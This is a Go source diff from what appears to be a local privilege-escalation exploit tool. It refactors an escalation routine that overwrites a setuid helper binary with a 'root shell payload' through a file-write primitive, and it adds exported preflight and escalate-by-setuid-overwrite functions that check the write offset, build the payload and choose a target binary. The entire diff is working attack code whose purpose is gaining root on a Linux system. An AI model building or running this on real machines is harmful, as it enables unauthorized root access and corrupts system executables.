@@ -38,6 +38,30 @@ func EscalateWithIO(primitive Primitive, stdin io.Reader, stdout, stderr io.Writ
 	return escalateWithStrategies(primitive, defaultEscalateStrategies(stdin, stdout, stderr))
 }
 
+func EscalateBySuidOverwriteWithIO(primitive Primitive, stdin io.Reader, stdout, stderr io.Writer) error {
+	stdin, stdout, stderr = normalizeShellIO(stdin, stdout, stderr)
+	return escalateBySuidOverwrite(primitive, stdin, stdout, stderr)
+}
+
+func PreflightSuidOverwrite(primitive Primitive) (target string, payloadLength int, err error) {
+	if primitive.MinOffset() != 0 {
+		return "", 0, fmt.Errorf("primitive min offset %d cannot overwrite an executable ELF header", primitive.MinOffset())
+	}
+	payload, err := suidShellPayload()
+	if err != nil {
+		return "", 0, err
+	}
+	if err := util.CheckSetuidExecutionAllowed(); err != nil {
+		return "", 0, err
+	}
+
+	target, err = selectSuidOverwriteTarget(suidHelperCandidates, len(payload))
+	if err != nil {
+		return "", 0, err
+	}
+	return target, len(payload), nil
+}
+
 type escalateStrategy struct {
 	name string
 	run  func(Primitive) error
@@ -111,16 +135,12 @@ func escalateBySuidOverwrite(primitive Primitive, stdin io.Reader, stdout, stder
 	if err != nil {
 		return err
 	}
-	if primitive.MinOffset() != 0 {
-		return fmt.Errorf("primitive min offset %d cannot overwrite an executable ELF header", primitive.MinOffset())
-	}
-	if err := util.CheckSetuidExecutionAllowed(); err != nil {
-		return err
-	}
-
-	target, err := selectSuidOverwriteTarget(suidHelperCandidates, len(payload))
+	target, payloadLength, err := PreflightSuidOverwrite(primitive)
 	if err != nil {
 		return err
+	}
+	if payloadLength != len(payload) {
+		return fmt.Errorf("suid overwrite payload length changed during preflight: %d -> %d", payloadLength, len(payload))
 	}
 	if err := primitive.Write(target, 0, payload); err != nil {
 		return fmt.Errorf("overwrite suid helper %s with root shell payload: %w", target, err)
